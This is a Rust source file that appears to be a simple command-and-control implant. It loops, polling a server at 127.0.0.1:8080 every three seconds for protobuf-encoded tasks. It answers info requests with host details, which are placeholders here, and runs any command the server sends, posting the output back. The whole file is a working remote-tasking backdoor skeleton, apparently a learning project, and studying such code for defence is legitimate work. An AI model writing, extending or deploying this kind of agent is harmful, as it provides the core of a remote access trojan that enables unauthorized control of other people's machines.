use anyhow::Result;
use bytes::Bytes;
use std::io::Cursor;

use c2::{task::Data, Empty, InfoReq, InfoRes};
use prost::Message;
use std::time::Duration;
mod c2;
#[tokio::main]
async fn main() -> Result<()> {
    loop {
        poll_job().await?;
        std::thread::sleep(Duration::new(3, 0))
    }
    // Ok(())
}
pub fn serialize_empty(req: &c2::Empty) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.reserve(req.encoded_len());
    req.encode(&mut buf).unwrap();
    buf
}
pub fn serialize_task_result(req: &c2::TaskResult) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.reserve(req.encoded_len());
    req.encode(&mut buf).unwrap();
    buf
}
pub fn deserialize_task(buf: &[u8]) -> Result<c2::Task, prost::DecodeError> {
    c2::Task::decode(&mut Cursor::new(buf))
}

async fn push_task_result(task_result: c2::TaskResult) -> Result<()> {
    println!("push task result start ...");
    let buf = serialize_task_result(&task_result);
    let url = "http://127.0.0.1:8080/push_task_result";
    let client = reqwest::Client::new();
    let res = client
        .post(url)
        .header("content-type", "application/protobuf")
        .body(buf)
        .send()
        .await?;
    println!("push task result end ...");

    Ok(())
}

async fn poll_job() -> Result<()> {
    println!("poll start ...");
    let url = "http://127.0.0.1:8080/poll";
    // let client = reqwest::RequestBuilder.headers(headers);
    let client = reqwest::Client::new();
    // let headers = reqwest::header;

    // let raw = [1u8; 10];
    let raw = serialize_empty(&Empty::default());
    let buf = Bytes::copy_from_slice(&raw);
    // client.
    let res = client
        .post(url)
        .header("content-type", "application/protobuf")
        .body(buf)
        .send()
        .await?;
    let res_bytes = res.bytes().await?;
    let task = deserialize_task(&res_bytes).unwrap();
    // dbg!(&task);

    let res = match task.data {
        Some(Data::Info(info)) => {
            println!("got job info: {:?}", &info);
            let mut res = c2::TaskResult::default();
            let info_res = InfoRes {
                ip: "127.0.0.1".to_string(),
                mac: "xxx".to_string(),
                username: "abc".to_string(),
            };
            res.data = Some(c2::task_result::Data::Info(info_res));
            res
        }
        Some(Data::Execute(execute)) => {
            println!("got job execute: {:?}", execute);
            let mut res = c2::TaskResult::default();
            // let exe
            let cmd = execute.cmd;
            let output = std::process::Command::new(cmd).output().unwrap();
            let output1 = String::from_utf8(output.stdout).unwrap();
            let data = Some(c2::task_result::Data::Execute(c2::ExecuteRes {
                status: output.status.success(),
                data: output1,
            }));
            res.data = data;
            res
        }
        None => {
            let mut res = c2::TaskResult::default();
            res.data = None;
            res
        }
    };
    let _ = push_task_result(res).await?;
    println!("poll over ...");
    Ok(())
}
